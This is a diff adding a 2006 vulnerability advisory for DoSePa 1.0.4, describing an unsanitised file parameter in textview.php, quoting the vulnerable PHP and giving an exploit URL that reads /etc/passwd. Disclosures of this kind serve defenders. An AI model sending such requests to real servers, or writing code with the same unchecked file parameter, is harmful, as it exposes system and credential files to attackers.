@@ -1,0 +1,33 @@
+#######################################################################################
+# Target:
+#
+#       DoSePa 1.0.4 (textview.php)
+#       http://sourceforge.net/project/showfiles.php?group_id=91686
+#
+# Vulnerability:
+#
+#       Information disclosure.
+#
+# Description:
+#
+#       The textview.php page in DoSePa does not properly sanitize the $_GET['file']
+#       value; this allows an attacker to view any file to which the server has
+#       read rights.
+#
+# Vulnerable Code (truncated):
+#
+#       $file=$_GET['file'];
+#       file_get_contents($file);
+#
+# Exploit:
+#
+#       http://dosepa.somesite.com/textview.php?file=/etc/passwd
+#
+# Discovery:
+#
+#       Craig Heffner
+#       heffnercj [at] gmail.com
+#       http://www.craigheffner.com
+#######################################################################################
+
+# milw0rm.com [2006-11-17]
